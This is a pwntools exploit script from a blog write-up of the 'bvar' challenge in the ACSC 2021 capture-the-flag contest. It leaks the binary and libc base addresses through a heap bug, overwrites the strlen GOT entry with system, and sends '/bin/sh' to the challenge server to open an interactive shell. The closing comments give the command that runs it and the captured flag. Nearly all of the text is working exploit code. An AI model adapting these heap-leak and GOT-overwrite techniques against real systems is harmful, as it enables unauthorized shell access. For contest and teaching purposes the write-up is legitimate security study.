# From https://stdnoerr.github.io/ctf/2021/09/19/ACSC2021.html by stdnoerr

#!/usr/bin/env python3
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote('35.194.119.116', 7777)
    else:
        p = elf.process(env = {"LD_PRELOAD": libc.path + ":./ld-2.31.so"})

def add(name: bytes, data: bytes):
    p.sendlineafter('>>> ', name + b'=' + data)

    return name[:4]

def delete(name: bytes):
    p.sendlineafter('>>> ', b'delete ' + name)

def edit(name: bytes, new_name: bytes):
    p.sendlineafter('>>> ', b'edit ' + name)
    time.sleep(1)
    p.sendline(new_name)

def show(name: bytes):
    p.sendlineafter('>>> ', name)

def clear():
    p.sendlineafter('>>> ', 'clear')

context.binary = elf = ELF('./bvar_patched')
libc = ELF('./libc-2.31.so')
start()

a = add(b'1234', b'test1')
b = add(b'4321', b'test2')
delete(a)

c = add(b'\xc8', b'hack')
show(b'')
binary_leak = u64(p.recvline(False).ljust(8, b'\x00'))
elf.address = binary_leak - 0x3594

clear()

a = add(b'1234', b'test1')
b = add(b'4321', p64(elf.got.exit))
delete(a)

c = add(b'\x08', b'hack')
show(b'')
libc_leak = u64(p.recvuntil('\x7f').ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.exit

clear()

a = add(b'1234', b'test1')
b = add(b'4321', p64(elf.got.strlen - 8))
delete(a)

c = add(b'\x60', b'hack')

if args.REMOTE:
    edit(p32((libc.address + 0x18b660) & 0xffffffff), p32(libc.sym.system & 0xffffffff))

else: 
    edit(p32((libc.address + 0xb4d30) & 0xffffffff), p32(libc.sym.system & 0xffffffff))

p.sendlineafter('>>> ', '/bin/sh')

p.interactive()
p.close()

# pythnon3 exp2.py REMOTE
# cat flag.txt
# ACSC{PWN_1S_FUN_5W33T_D3liC1ous :)}